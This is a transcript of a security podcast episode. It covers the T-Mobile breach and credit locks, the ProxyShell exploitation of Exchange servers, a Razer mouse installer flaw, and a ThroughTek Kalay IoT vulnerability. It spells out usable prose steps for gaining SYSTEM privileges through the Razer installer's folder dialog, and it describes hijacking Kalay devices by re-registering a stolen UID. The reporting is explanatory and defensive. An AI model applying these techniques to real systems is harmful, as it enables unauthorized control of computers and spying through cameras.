We look at three additional so-called "overlay networks," which add to Tailscale.  There are some other alternatives that have come to light since I mentioned Tailscale that I wanted to share with our listeners.  And also we look at the consequences of yet another Orange Tsai Microsoft Exchange Server exploit chain discovery.  That would be the ProxyShell exploit chain.  We'll also examine a simple-to-make flaw in Razer gaming mouse installer, which generated...



LEO:  That was the funniest story ever.



STEVE:  It is.  And it generated an outsized response.  But, okay, so on the one hand it's like, really?  Like everyone was calling it a zero-day and jumping around.  But what's really interesting is that once you see this - and Will Dormann from CERT commented exactly along these lines, and I'll share that - you then have to ask, how many other of these have happened and no one noticed, and how many have yet to be found?  So we'll talk about that.  We also have another worrisome IoT protocol screw-up.  I want to share a couple of feedback notes and a question from our listeners.  Then I'm going to conclude by following up, as I said, on last week's discussion of Microsoft's apparent culpable negligence with a proposed explanation of their behavior and motivation, which fits the facts so well that it offers an explanation that I would call "reasoned neglect."



LEO:  Hmm.  Hmm.



STEVE:  And of course we've got a great Picture of the Week.  So, yeah.



LEO:  That's quite interesting.  I look forward to hearing this thought experiment, I guess we would call this.  Yeah?  Because you don't have any inside information from Microsoft.



STEVE:  Well, it's funny because I was sure that I mentioned something years ago.  And I put the gang in the Security Now! newsgroup on the hunt, and one of those people found the podcast where I said what it was that I was sure I remembered.  And it turns out I was quoting Bruce Schneier, of all people.



LEO:  Oh, interesting.



STEVE:  So that's going to be good.



LEO:  Okay.  Good.  This is a continuing saga.  The Picture of the Week saga continues.



STEVE:  We've been in a, for better or for worse, a wires phase for a while now.



LEO:  Yeah.



STEVE:  This one was sent by a listener who saw the other wiring cabinets, and I guess he remembered this.  This is very cool.  This is a photo of what was described as the old Telefontornet telephone tower in Stockholm, Sweden, with approximately 5,500 telephone lines circa 1890.  If you follow that link below the picture, Leo, there are actually some other very cool photos.  But this is, if you scroll down a bit, you'll see like they have one of the tower before it was wired up, which is...



LEO:  Oh, my god.  It was meant to be wired like that.  Wow.



STEVE:  Oh, yeah, yeah.  This thing was designed so it's a 3D large tower, and you can see if you look really closely, little tiny glass bobbins, you know, insulators, where the wires are all going to be terminated in this massive array.



LEO:  Holy cow.



STEVE:  So the description with this thing says:  "In the late 19th Century, the miracle device called the telephone had been invented, but the simple concept of undergrounding telephone cables had eluded engineers.  Due to technical limitations of the earliest phone lines, every telephone required its own physical line strung between" - they didn't have party lines back then.



LEO:  It was point-to-point.  It was all point-to-point.



STEVE:  Point-to-point, exactly.



LEO:  Wow.



STEVE:  "...strung between a house or business to a phone exchange where the call was manually connected by a live operator."



LEO:  I am connecting your call now with a patch cable.  This is before they figured out switches, I guess.  This is incredible.



STEVE:  Oh, yeah, yeah, 1890, Leo.



LEO:  Yeah.



STEVE:  You know?  So, yeah, they had literally patch cords.  So this thing said:  "The somewhat quixotic result of so many individual lines was the construction of elaborate and unsightly towers that carried hundreds to thousands of phone lines through the air.



"In Stockholm, Sweden, the central telephone exchange was the Telefontornet, a giant tower designed around 1890 that connected some 5,000 lines which sprawled in every direction across the city.  Just by looking at historical photos it's easy to recognize the absurdity and danger of the whole endeavor, especially during the winter months.  Everything that could possibly go wrong did, from high winds to ice storms and fires.  The network was extremely vulnerable to the elements.  Luckily, phone networks evolved so rapidly that by 1913 the Telefontornet was completely decommissioned" - oh, so maybe the picture of the tower was after it had been decommissioned.  Anyway, it was completely decommissioned "in favor of much simpler technology.  The remaining shell" - ah, that's it.  "The remaining shell stood as a landmark until it, too, caught fire in 1953 and was torn down."



LEO:  Was it wood?  Oh, my god.



STEVE:  Yeah, yeah. 



LEO:  Holy moly.



STEVE:  Wow.  Anyway, the picture is wonderful.  I mean, the cabling is so dense it almost looks like mist.  I mean, it's like...



LEO:  I thought it was the wind at first.  It was the wind whipping through it.



STEVE:  Exactly.  Those are individual phone lines going out to subscribers who, by the way, paid a hefty fee.  This thing says it originally had only 121 subscribers.  Of course it grew to 5,500.  They said:  "The telephone company charged subscribers between 160 and 280 Swedish krona, depending on the subscriber's location and distance from the exchange.  This was equivalent to paying a subscription fee of what would today be 9,000 to 16,000 krona," which in U.S. dollars is 1,100 to $2,000 in today's value, which is a month, a very high rate, obviously.  But still, if you had some business purpose for having a phone, or it was just cool, then yeah, you'd pay the price.  Anyway, just another cool photo.  And are we done with those?  I think maybe we're done.  We'll see what happens.



LEO:  Wow.



STEVE:  Okay.  Speaking of downloading, which we weren't, but we will, Firefox will soon be blocking mixed-content downloads by default.  Back in 2020, as we discussed at the time, Chrome and its brethren Chromium browsers gradually made the switch to blocking mixed-content downloads, sort of in that halting sort of let's not make any mistakes here, we're going to stick our toe in and see what happens way that Chrome has, between releases 81 through 88, when by the time we got to 88 it was like, okay, fine, if you're on a secure page, we're not going to let you download anything over an unsecured link.



So that feature, which is actually already present in Mozilla today, but not yet enabled by default, will soon be flipped on for everyone.  Once that's done, all HTTP files downloaded from an HTTPS page will be blocked with a message in the Firefox Download Center.  An option will be available to allow you to push past it, after saying yes, yes, yes, I know, I realize there's a danger, blah blah blah, if users choose to.  Which I think is the right tradeoff, just to keep you from doing it by mistake, if some page is trying to trick you for some reason.  On the other hand, it's an HTTPS page, so it's got to really be at this point, I would argue, negligence on the part of people running HTTPS sites who are sort of lazily still serving HTTP downloads without having switched over.  Probably no reason not to switch at this point.



LEO:  I wonder, I'm thinking maybe we might fall into that because of course our sites are HTTPS, only because Google would penalize you if you weren't, but maybe the podcasts - I guess, are they HTTPS?  I don't even know.



STEVE:  I bet they must be.  I'm never getting any warnings when I'm downloading content.



LEO:  Yeah, they must be.  Apple warns you every single time you download something from any site at all.



STEVE:  Wait a minute, you're downloading something.



LEO:  It literally says that.  Are you sure you want to download something from this site?  Yes.



STEVE:  You know, you're an iOS user.  And, you know, really, what do you need to download something for?



LEO:  There is a balance between too many warnings, you know, you have too many warnings, people just start ignoring them.



STEVE:  Yeah, like have you seen one of those cookie warnings lately, Leo?



LEO:  Yeah, my god.



STEVE:  It's like, come on.



LEO:  Oh, don't get me started.



STEVE:  One thing nice about Firefox, because they still are the browser for the rest of us, directly accessed HTTP download links which are copy-and-pasted into Firefox's address bar, will not be blocked.  That is, obviously they really can't be because you're not coming from a secure page.  The idea is just to prevent somebody from tripping over themselves by mistake, by having some download that nobody's looked at for a while.  So if nothing else, if a site has HTTP download links, Firefox is going to say, hey, you know, maybe you should ask the webmaster, if there is such a thing anymore, why these things are HTTP and not HTTPS.



Anyway, the cool thing is you can turn this on right now in Firefox before 92.  This will be default in 92, which is like sometime the start of September.  Next podcast is the 31st of August.  So after next Tuesday, that's the start of September, we're going to get Firefox 92.  But if you go to about:config and bring up that infinite list of things you can play with, and you put the word "insecure" into the search box, the first thing still of many that comes up is dom - document object model - "dom.block_download_insecure."  You flip that to true.  It'll be false right now by default.  Turn it on, and then Firefox will start behaving the way it's going to in a week.  So make the jump.  Not that it really makes that big a difference anyway, one way or the other.



LEO:  I think that mixed-content warning confuses the hell out of normal people.



STEVE:  Yup.



LEO:  They don't know what that means, or what to do about it even.



STEVE:  No.  Yes, Leo, this was really not designed for all of this, you know.



LEO:  None of this was designed for normal people.



STEVE:  No.  My poor mom.  HTPTP what?



LEO:  Oh, god.



STEVE:  Colon slash slash?



LEO:  It's as bad as you trying to pronounce Swedish.  It's just not going to work.



STEVE:  She said, "Do I still have to use AWOL?"



LEO:  Oh, my gosh.



STEVE:  I'm like, yes, Mom.  Yes, Mom.



LEO:  But I feel really bad for people who don't have a technical bent.  This stuff is crazy.



STEVE:  It is.



LEO:  That's why we listen.  That's why we listen to the show, yeah.



STEVE:  Not getting less crazy.  Okay.  So the news from T-Mobile is all bad.  Last week T-Mobile confirmed their latest data breach, making it the fifth data breach in four years.  They're going to have to start explaining to someone what their problem is.  There were two previous attacks in 2020, last year; one in 2019; and the first in 2018.  But this most recent breach is the largest by far.  And the numbers of affected customers keep growing, like, as they keep digging into this like, oh, what happened?  First it was like, wait, we got breached?  Who says?  They didn't know.  Literally.  Until someone started selling the content on the dark web.  The most recent update reveals that the cyberattack exposed over 54 million individuals' data.  Last weekend, a threat actor began selling the personal information, claiming it was 100 million T-Mobile customers on a hacking forum for - he was asking 6 BTC, which is about 280K right now because, as you commented recently, Leo, bitcoin is coming back - I think it was on Sunday.



LEO:  Almost 50.



STEVE:  It's coming back.  It's creeping back up again.  And I'm  moaning about the 50 that I just said, eh, who needs these?



LEO:  Don't think about it, Steve.  Don't think about it.  It's not good.  So this is the text I got from T-Mobile.  "Unauthorized access to some of your personal data.  We have no evidence."  Of course they're morons.  But "We have no evidence that your debit/credit card information was compromised.  But we're going to give you just in case three years of credit monitoring, free."  Thanks.



STEVE:  Yeah, yeah.  So we'll talk about what users should do in a second.  Hopefully all of our listeners have.  So this hacker claimed that the stolen database contains the data for approximately 100 million T-Mobile customers.  Now, here's the bad part.  This is not one of those, well, yeah, they got the hashed password.



LEO:  No.



STEVE:  The exposed data can include customers' IMSI, IMEI...



LEO:  What's IMSI?  I know IMEI.



STEVE:  That's one of the other things, you know, they're big crypto, you know, strings of numbers.  But you don't want anybody to have them because they could get up to mischief, like clone your SIMs and things.  Phone numbers, customer names, security PINs, Social Security numbers, driver's license numbers, and date of birth.  And of course names; right?  So in other words, the keys to the identity theft kingdom.



LEO:  Yeah.



STEVE:  The database was said to have been stolen approximately three weeks ago, apparently when T-Mobile was on vacation, and contains customer data dating back as far as 2004.  In an interview with the hacker, which Lawrence Abrams of BleepingComputer, he's BleepingComputer's founder, Lawrence Abrams had this interview, reported that the hacker said their entire IMEI history database going back to 2004 was stolen.  So that's all of the, basically, the serial numbers of all the T-Mobile phones that they've had accounts for since '04.  Okay.  And that was, what, a year before the podcast.  So 18 years of data that's been stolen.



After the data first went up for sale, T-Mobile later confirmed, oh, some of our servers have been hacked, what do you know, and began investigating what customer data had been exposed.  Last Tuesday, on August 17th, T-Mobile first said that the personal information of 48.6 million individuals was exposed during the attack.  They later updated that to include an additional six million customers - oh, six million more - or prospective customers who were also affected by the attack.  You don't even have to have, like, signed on the dotted line.  No, you just open a conversation with T-Mobile, and you're history.  So T-Mobile also confirmed that the attackers stole their customers' IMSI and IMEI numbers.  That was confirmed.



Okay.  So here's a breakdown.  13.1 million current T-Mobile postpaid customer accounts, as opposed to, distinct from prepaid.  So 13.1 million current T-Mobile postpaid customer accounts that included first and last names, date of birth, Social Security number, and driver's license/ID information.  Bad.  Bad, T-Mobile, bad.  40 million former or prospective T-Mobile customers, including first and last names, date of birth, Social Security number, and driver's license/ID information.  Okay, so a total of 53.1 with all of that.  Basically game over.  667,000 accounts of former T-Mobile customers exposing customer names, phone numbers, addresses, and dates of birth were compromised.  850,000 active T-Mobile prepaid customer names, phone numbers and account PINs were exposed.  So even if you're prepaid, you're still hosed.  And finally, 52,000 names related to current Metro by T-Mobile accounts may have been included.  So, yeah, count yourself in.



Okay.  So identity theft is one of those things that can really screw up one's life.  You need to prove that it wasn't you who applied for and received credit under your name, when the other person provided, you know, the other person you're proving, some other mysterious we-don't-know-who other person provided all of the personal information that only you are presumed to have.  So such cretins immediately run up massive charges under your name, using and destroying your credit.  There are tons of horror stories about the mess this has caused for people.  I mean, it's ruined lives.  And what's needed to apply for credit in someone else's name?  Exactly the data that has just been exposed for tens of millions of T-Mobile customers because, guess what, that's what you provided to get credit from T-Mobile.  They said, oh, yeah, this is what we know about people that convinced us to give them credit.  Let's have it all sold on the dark web.



Okay.  So this is why the absolutely number one best advice I have, the advice I give to anyone and everyone, is to simply run with permanent locks on your accounts at all three of the credit reporting bureaus:  Experian, TransUnion, and Equifax.  I've had all three locked for me since I first talked about this years ago during one of these identify theft events.  This is easily done for someone who is not routinely applying for credit.  You know, Leo, those of us who have thinning hair.



LEO:  It's easier for us, yeah.



STEVE:  It's easy for us.



LEO:  Yeah, if you're getting credit cards, you have to unfreeze.  If you're getting a car, you have to unfreeze.



STEVE:  Yeah, because you have to let those creditors check your credit.



LEO:  And by the way, you have to give them your Social Security number, your driver's license, all of this stuff that - this is why T-Mobile has it, because they run credit checks before you can get a prepaid phone.



STEVE:  Exactly.



LEO:  Or a postpaid phone, yeah.



STEVE:  And unfortunately they don't wipe it, obviously.  They just hold onto it.



LEO:  They just keep it.  Why not?



STEVE:  That's right.



LEO:  And we certainly wouldn't want to secure it or anything.



STEVE:  Cloud storage is so cheap.  Maybe that'll be useful.  Okay.  The good news is it has recently become easier for those who do need to occasionally unfreeze their credit worthiness.



LEO:  More importantly, free, thanks to federal intervention.



STEVE:  Yes.



LEO:  Used to be expensive.



STEVE:  A couple of years ago I realized that I was losing money by not using an Amazon branded credit card for my many purchases through Amazon, since they were providing a couple of points of discount for purchases made through their own card.  Why would I not take advantage of that?  So I had the occasion to need to lift the locks on my credit.  What I discovered was that all three of the agencies now offer a convenient free 10-day unlock with automatic relock.  So I told them all to start the 10-day counter.  I applied for the Amazon card, qualified through whichever one of the three agencies Amazon queried, and then all of them were automatically relocked.



So it makes it so practical, you know, with accounts locked this way, no would-be creditor is able to query for my credit, and thus no creditor would allow a thief to open a credit account under my name.  So I'll just say it again.  If you have not done it, if you are not continually needing for some reason to have creditors accessing your credit with those big three firms, then why not lock those agencies down?  It's trivial to do, and it buys a lot of peace of mind.



LEO:  Doing it right now.  And it's free now, as we said, to freeze and unfreeze, yeah.



STEVE:  Yeah.



LEO:  So there's a fraud alert, and there's a credit freeze.  The credit freeze is what you want.  Fraud alert you have to have fraud first.



STEVE:  Actually, there's a freeze, and there's a lock.  Unfortunately, the jargon can be confusing.  The freeze is temporary.  The lock is permanent.



LEO:  Ah.



STEVE:  So the lock is what you want.



LEO:  Okay.



STEVE:  So I'm glad you brought it up because you do need to read through that and look at what it is that they're doing.  But mine are just permanently locked.



LEO:  Lock, yeah.



STEVE:  And the other cool thing is when I was just looking at it yesterday, I'd forgotten that there are now iOS apps that allow you, after verifying you are who you are, to use the app to unlock your credit on a transient, temporary basis.  So it really becomes quite a practical thing to do.  Again, everybody in my opinion, I mean, unless you're newlyweds buying all kinds of stuff and cars and homes and things, just lock that stuff down.  You want to protect your credit and not have it destroyed by somebody, I mean, look at all this mess that T-Mobile has just created for people.  Oh, we're going to give you a free three-year...



LEO:  From McAfee of all people.  Geez, Louise.



STEVE:  Oh, great.



LEO:  Yeah.  Two years, by the way.  Not three years.



STEVE:  Endorsed by John himself.



LEO:  Yeah.



STEVE:  Okay.  So ProxyLogon's kissing cousin ProxyShell.  Now, we're talked about this guy before, the Taiwanese security researcher known as Orange Tsai, T-S-A-I, whose work we've covered before, unveiled his ProxyShell exploit chain during the Pwn2Own 2021 hacking contest a few months ago, in April of this year.  We talked about it at the time.  The chain invokes three unique and original exploits, and they are doozies.  That's the technical term.  There's CVE-2021, then we have 34473, 34523, and 31207.



So get this.  The first one provides a mechanism for pre-authentication remote code execution, enabling malicious actors to remotely execute code on an affected system.  And we're talking about Microsoft Exchange Server.  So pre-authentication remote code execution.  Meaning you don't have to have an account.  You don't have to prove who you are.  This is before authenticating an identity, you can remotely execute code.



Then we have the second one, enables malicious actors to execute arbitrary code post-authentication on Microsoft Exchange servers due to a flaw in the PowerShell service not properly validating access tokens.  And the third one enables post-authentication malicious actors to execute arbitrary code in the context of system, you know, root for Windows, and write arbitrary files.



Okay.  So we have a pre-auth remote code execution exploit and a pair of post-authentication exploits, one of which enables an attacker to execute arbitrary code as root and to write arbitrary files.  Do you imagine that a talented hacker might be able to make something of those?  Orange Tsai used this trio to completely take over a Microsoft Exchange Server remotely, and in so doing earned himself $20,000 for a successful server compromise last April.  Of course, part of the deal of Pwn2Own is that the details of any vulnerabilities used are immediately turned over to the publishers of the impacted software.  So in this case the details of the exploit chain were immediately shared with Microsoft, following which Microsoft promptly patched the three vulnerabilities in May and July this year.



Okay, now, I'll just note that the vulnerabilities were demonstrated publicly.  The details were handed over to Microsoft, whereupon Microsoft promptly patched the three vulnerabilities the following month and month after.  That's not what happened at the beginning of the year, when vulnerabilities were privately disclosed to Microsoft.  But I'm getting ahead of myself.  We'll be discussing that at the end of the podcast.  Just worth noting that when they are publicly disclosed, Microsoft fixes them.



Okay.  Then during his follow-up talk at Black Hat, during the first week of this month, of August, Orange Tsai disclosed additional information about the attack.  As one would at a Black Hat conference; right?  Microsoft patched this in May and July.  So next month, time has passed, disclose a little bit more.  That information was enough to allow it to be leveraged.  And shortly following his attack, there was publication of additional technical information by other researchers who had managed to recreate it.



After that, it didn't take the bad guys long to start looking for vulnerable Microsoft Exchange servers.  And sure enough, as with the earlier ProxyLogon and ProxyOracle disclosures in March and April of this year, not all server administrators jumped on those patches.  Consequently, a scan performed two Sundays ago, on August 8th, by SANS Security, which was two days after the publication of ProxyShell's proof-of-concept code, yet weeks after the April and July Patch Tuesdays that were supposed to fix this, that scan discovered, okay, two Sundays ago, more than 30,400 Exchange servers from a total of 100,000 systems that had yet to be patched and remained vulnerable.



So before the releases, 100,000 systems, there are 100,000 Microsoft Exchange servers out on the Internet, they were all originally vulnerable.  Two weeks ago, what, a little more than two-thirds of them had been patched, but were still at 30% unpatched.  I have a chart in the show notes that shows sort of the typical exponential patch rate that you see, where there's initially a lot of machines being patched.  The number of vulnerable machines is falling rapidly.  But inevitably it just sort of slows down.  And notice that this chart, Leo, is zero-based.  And it stopped dropping.  I mean, after a couple weeks, all the machines that were going to be patched have been patched.



And in fact there's a little bit of a dip, it looks like a few new ones came online and haven't been patched or something.  Or maybe the scan just had not found them that particular week.  But this is the lesson that we see is that, you know, there are still machines out there with Code Red and Nimda scanning the Internet that will be doing it until someone finally trips over the plug and unplugs those things.  So it looks like it's leveling off around, what, 15,000 machines that are just still vulnerable and are going to stay that way.



So the initial pre-exploitation started with scans for vulnerable systems.  Security researchers with honeypots and fake Exchange servers set up, they were monitoring this.  Pre-exploitation started with scans for vulnerable systems, which then quickly turned into actual attacks over this past weekend, according to honeypot logs collected by security researchers Rich Warren and Kevin Beaumont.  We've talked about that pair of researchers before.  This is a thing they do.



After that, attacks intensified last week, and a new ransomware operation known as LockFile began using this ProxyShell exploit as a way to enter corporate networks.  Kevin Beaumont, tweeting from his @GossiTheDog account, wrote last Friday:  "ProxyShell is now being used to drop corporate ransomware, as is PetitPotam, same IP and actor as in this thread.  Myself and @buffaloverflow..."



LEO:  Telefontornet.  Oh, I'm sorry, no, that's last week, never mind.



STEVE:  Yeah, exactly, "..have been watching them."  Anyway.  And then on Friday, security firm Huntress Labs said it scanned Microsoft Exchange servers that have been hacked using ProxyShell and - get this - found more than 140 different web shells on more than 1,900 Exchange servers.  So game over for those.  And that's about where that line leveled off, right up around somewhere like 1,900, 1,500 servers.  And remember that a web shell is the most trivial to plant and difficult to spot  bit of code.



On any server using server-side script interpretation - and Microsoft Active Server Pages (.asp) is ubiquitous on Windows servers, and it's effectively impossible to get rid of.  Every time I update, this thing rears its ugly head again, and I have to shut all these things down manually.  Anyway, so the point is just a short and simple page of text can be written to implement a listening web shell.  You get that file.  Remember that there was a file write vulnerability?  Uh-huh.  That's all you have to do.  Write one of these little pages, tuck it into the server somewhere among all the other .aspx things, and you've got yourself a web shell. 



And this fact, I mean, just that it's that easy to do this, really demonstrates the security short-sightedness that's inherent in server-side scripting.  It's another classic example where ease of use has vastly outstripped the teachings of security principles.



Kyle Hanslovan, the CEO and co-founder of Huntress Labs, said:  "Impacted organizations thus far include building manufacturers, seafood processors, industrial machinery, auto repair shops, a small residential airport, and more."  So anyway, the long tail on that "servers remaining vulnerable" chart makes clear that it's going to be a long time, if ever, until these previously installed instances of Exchange Server stop being infested with malicious malware.



So once again, a gifted researcher, the same guy who way back in October of 2020 told Microsoft about those previous ProxyLogon vulnerabilities that Microsoft then sat on for months, that guy, he used three different ones to win himself $200,000 from Pwn2Own, waited for Microsoft to patch them, gave them a few more weeks for the patches to take hold, then did his Black Hat briefing to explain a little bit more about them.  Still holding back some information, but that was enough for talented researchers to essentially reverse-engineer from the data he had given, create ProxyShell, proof of concept went public.  Immediately it was picked up, and Exchange Server is being attacked.  In this case, you can't blame Microsoft.  They published the patches, pushed out the patches immediately.  It was just that there was the typical, far less than 100% uptake rate.  And that's enough these days for there to be problems.



Probably the most noise was made during the past week, this weekend, over a clever hack that someone discovered involving the installation of drivers for the Razer mouse, R-A-Z-E-R.  Though describing it as a zero-day vulnerability, as much of the tech press has, seems a bit much to me.



Okay.  So for those who don't know, Razer is a popular manufacturer of gaming-oriented peripherals, mice and keyboards.  So as Windows will, when a device is encountered for which it lacks currently installed drivers, it fetches them on the fly over the Internet from its vast repository of driver installation packages which have been pre-written and submitted by the vendors of those third-party products.  We all know this as "plug-and-play," or somewhat less charitably as "plug and pray."



In any event, when a Razer device is first introduced to Windows, the OS automatically obtains and begins to install the Razer Synapse software onto the local machine.  Razer's software allows their customers to configure and customize their hardware, setting up macros, mapping buttons, and so on.  And Razer's products are quite popular, being used by more than 100 million users worldwide.



So as it happened, a security researcher using the handle "jonhat" (J-O-N-H-A-T) discovered an exploitable escalation of privilege mistake that had been made in the driver installation flow which allows users whose local privilege may have been tightly locked down, to escape that lock and obtain full local privileges of the root system account, and to do so with somewhat surprising ease.  Since device installation needs to make deep changes to a system, Windows runs these installers with system privileges so that they'll be able to make the changes they need.



And by the way, this is another horrible kludge in Windows.  I learned during the development of SQRL's self-installation system that, believe it or not, Windows employs the messy heuristic of sniffing programs being run, I kid you not, looking for strings such as "setup" or "installer," and treats such programs differently.  I couldn't believe it when I ran into that.  But yes, it's true.  Anyway, the program RazerInstaller.exe will be downloaded and executed by a Windows operating system process running with system privileges.  This allows the RazerInstaller.exe child process to inherit the same privileges as its parent.  That's necessary to enable that installer to do what it might need to do.



Okay.  Everything's fine so far.  But the mistake the Razer developers made was in then causing the setup wizard to allow the user to specify the folder into which the software should be installed without restricting its rights.  Okay.  In other words, if the user elects to alter the default installation destination, Windows will present the Choose a Folder dialog.  But in this instance this dialog, because it's been launched from the Razer installer, which has system rights, will also have inherited the installer's full system privileges.



So if a clever user holds down SHIFT and right-clicks on that dialog, a context menu will pop up and, surprise, among its various options is "Open PowerShell Window Here."  Whoopsie.  If that option is selected, sure enough, a PowerShell window is opened, having the same rights as the dialog that spawned it, namely full system privileges.



So, in short, the mistake of not reducing the rights of a dialog spawned by a privileged installer, which any locked-down user having no rights can cause to be launched just by connecting any Razer mouse to a system, grants that user full and unrestricted root level access on any Windows machine to which they have physical access.



LEO:  It seems like this is going to be much more than just that Razer mouse; right?



STEVE:  Exactly.  Having discovered this important oversight, "jonhat" attempted to do the right thing with his discovery.  And had he succeeded, this would have made much less high waves.  He reached out and tried to responsibly contact and notify Razer.  They blew him off.  So after not receiving any response from Razer, he posted his discovery to Twitter last Saturday, tweeting:  "Need local admin and have physical access?  Plug in a Razer mouse or the dongle.  Windows Update will download and execute RazerInstaller as system.  Abuse elevated Explorer to open PowerShell with SHIFT+RIGHT CLICK.  Tried contacting @Razer, but no answers.  So here's a freebie."



Now, if you're thinking, Leo, as you are, gee, that seems like an easy mistake for someone to make, I wonder whether any other installers do that, too, you would be in good company.  The following day, last Sunday, CERT/CC's Vulnerability Analyst Will Dormann observed and tweeted:  "Many vulnerabilities fall into the class of 'How has nobody realized this before?'"



LEO:  Yeah, yeah.



STEVE:  He said:  "If you combine the facts of 'connecting USB automatically loads software' and 'software installation happens with privileges,'" he said, "I'll wager that there are other exploitable packages out there."  So, yeah.  You didn't have to do any, as you said, deep hacking.  Just it's a clever hack, and it's probably a lot more widespread than we suspect.  And again, as I said, this is just - this is what happens when a system like Windows becomes so complicated that nobody, there's no single individual who understands the whole thing.  You just can't.  There's too much of it.  And it's just grown with all these barnacles growing on it over time that end up giving you ways around things that were never intended.



I actually had to, in the case of my SQRL self-installer, I had to, I think I had to, I think in the properties in SQRL's context menu I had something like, you know, SQRL self-install or something.  Or maybe I was - I think I was renaming the EXE as SQRL Installer and then relaunching it under that name, and suddenly Windows got involved and popped up the UAC dialog because something was trying to run that had "installer" in its name.  And I said, what?  You're kidding me.  The name of the EXE matters?  Yup.  Sure enough.  Windows just goes, oh, look.



LEO:  We've got to check something.



STEVE:  It's got "installer" in the name.  Let's...



LEO:  We've got to look at something.



STEVE:  Oh, my god, you're kidding me.



LEO:  Yeah.  Seems pretty basic.  But, you know, hey.



STEVE:  Unbelievable.  Okay.  So in IoT news, a critical ThroughTek - ThroughTek is a company no one's ever heard of because they sell an SDK and technology to OEMs who then repackage it in their own products.  Anyway, this SDK flaw enables IoT spying pervasively.  It turns out that out there somewhere on the order of 83 million actively in-use IoT devices which are streaming live audio and video, are doing so over a little known and not very secure peer-to-peer network that goes by the name Kalay, K-A-L-A-Y.



Last Tuesday, so a week ago, the guys at FireEye from their Mandiant security team posted the news of their discovery under the title "Mandiant Discloses Critical Vulnerability Affecting Millions" - yes, 83 millions - "of IoT Devices."  So in their posting they explain:  "Today, Mandiant disclosed a critical risk vulnerability in coordination with the Cybersecurity and Infrastructure Security Agency" - that mouthful known as CISA - "that affects millions of IoT devices that use the ThroughTek Kalay network.  This vulnerability, discovered by researchers on Mandiant's Red Team in late 2020, would enable adversaries" - and in fact does - "to remotely compromise victim IoT devices, resulting in the ability to listen to live audio, watch live real-time video data, and compromise device credentials for further attacks based on exposed device functionality.  These further attacks could include actions that would allow an adversary to remotely control affected devices."



And again, we don't know it, but things that have video on them, you know, webcams, baby monitors and such, they all OEMed this technology to solve their audio and video streaming problem from these guys, and as a consequence there are 83 million devices out there, not secure, all using this technology.



"At the time of this writing," they said, "of writing this blog post, ThroughTek [T-H-R-O-U-G-H-T-E-K] advertises having more than 83 million active devices and over 1.1 billion monthly connections on their platform.  ThroughTek's clients include IoT camera manufacturers, smart baby monitors, and Digital Video Recorder products.  Unlike the vulnerability published by researchers from Nozomi Networks in May of 2021, also in coordination with CISA, this latest vulnerability allows attackers to communicate with devices remotely.  As a result, further attacks could include actions that would allow an adversary to remotely control affected devices and could potentially lead to remote code execution."



Okay.  I know I sound like a broken record about this.  But let me just say this again:   You do not want any of your IoT devices sharing a network with your PCs.



Resuming their posting, they said:  "The Kalay protocol is implemented as a Software Development Kit which is built into client software" - thus we don't see it - "for example, mobile or desktop applications and networked IoT devices such as smart cameras.  Due to how the Kalay protocol is integrated by original equipment manufacturers (OEMs) and resellers before devices reach consumers, Mandiant is unable to determine a complete list of products and companies affected by the discovered vulnerability."  Again, it's a library that's just built into things.  The vulnerability that they have uncovered has been assigned a CVSS base score of 9.6.  In other words, it's a baddie.



LEO:  Wow.



STEVE:  Yeah.  And it is tracked as CVE-2021-28372.  And then FireEye has their own designation, 2021-0020.  They said:  "This blog post discusses the Kalay network and 28372 at a high level. It also includes recommendations from ThroughTek and Mandiant, along with mitigation options."  And again, here we are, great, it's neat that they came up with this and that they worked with Kalay this year to fix the problems in the SDK and their network, but there's already 83 million devices that will never be updated.  Your baby monitor, your webcam, never be updated.  They can't have their protocol changed.  It's in their firmware.



So, okay.  "Mandiant," they said, "would like to thank both CISA and ThroughTek for their coordination and support in releasing this advisory."  I've got a link for the whole advisory for anyone who's interested.  I won't go into that.  But what they did is kind of cool.  Mandiant researchers analyzed ThroughTek's Kalay protocol using two different approaches.  First, the researchers selectively downloaded and disassembled applications from both the Google Play Store and Apple App Store that included the ThroughTek libraries.  These libraries typically do not contain debugging symbols.  You hope they don't because that makes reverse engineering them by bad guys really easy.  It also makes the apps much bigger.  So hopefully the debug symbols have been stripped out before these things were shipped.  No debugging symbols required the team to also perform dynamic analysis with tools such as Frida, gdb, and Wireshark.



In addition, Mandiant purchased various Kalay-enabled devices.  That is to say, you know, the baby monitors and the webcams and so forth.  The team performed local and hardware-based attacks to obtain shell access, recover firmware images, and perform additional dynamic testing.  These techniques included identifying UART/JTAG interfaces; performing chip-off attacks,  meaning lifting the chips off and then analyzing them separately; and exploiting other debugging functionality present on the devices.  So I just want to stop here and note, this is a lot of work that these guys went through.  Why?  Because it's a closed, secret, undocumented, proprietary network.  No one ever looked at it before.  That didn't stop it from being licensed.  It should have, but it didn't.  And as a consequence, 83 million devices already out there, unfixable, can be taken over remotely and be used to spy on people.  Ooh, look what that camera is showing.



Anyway, over the course of several months, the researchers developed a fully functional implementation of ThroughTek's Kalay protocol.  In other words, they reverse engineered and had to develop from scratch the entire thing by taking the things that were implementing it apart in order to figure out how it worked.  This enabled them to perform key actions on the network, including device discovery, device registration, remote client connections, authentication, and most importantly, process audio and video data.  They demonstrated all these attacks themselves.



Equally as important as processing AV data, the Kalay protocol also implements remote procedure call functionality.  What could possibly go wrong?  This varies from device to device, but typically is used for device telemetry, firmware updates - oh, maybe there is a chance this thing could be updated remotely - and device control.  Again, depending upon the device.



Having written a flexible interface for creating and manipulating Kalay requests and responses, Mandiant researchers focused on identifying logic and flow vulnerabilities in the Kalay protocol.  So not only did they first reverse engineer the whole thing and create their own implementation of it, then they said, okay, what's wrong with it? 



"The vulnerability discussed in this post," they wrote, "affects how Kalay-enabled devices access and join the Kalay network.  The researchers determined that the device registration process requires only the device's 20-byte uniquely assigned identifier, called a UID, to access the network.  In Mandiant's testing, this UID was typically provided to a Kalay-enabled client, such as a mobile application, from a web UI hosted by the company that markets and sells a device model.  Mandiant investigated the viability of brute forcing ThroughTek UIDs and found it to be infeasible due to the necessary time and resources."  So we can thank our stars for that.



If an attacker obtains a UID of a victim Kalay device, which they noted can be done through passive eavesdropping, they can maliciously register a device with the same UID on the network and cause the Kalay servers to overwrite the existing Kalay device.  Once an attacker has maliciously registered a UID, any client connection attempts to access the victim UID will be redirected to the attacker.  The attacker can then continue the connection process and obtain the authentication materials, a username and password, needed to access the device.  In other words, it's like made for man-in-the-middle attacks.



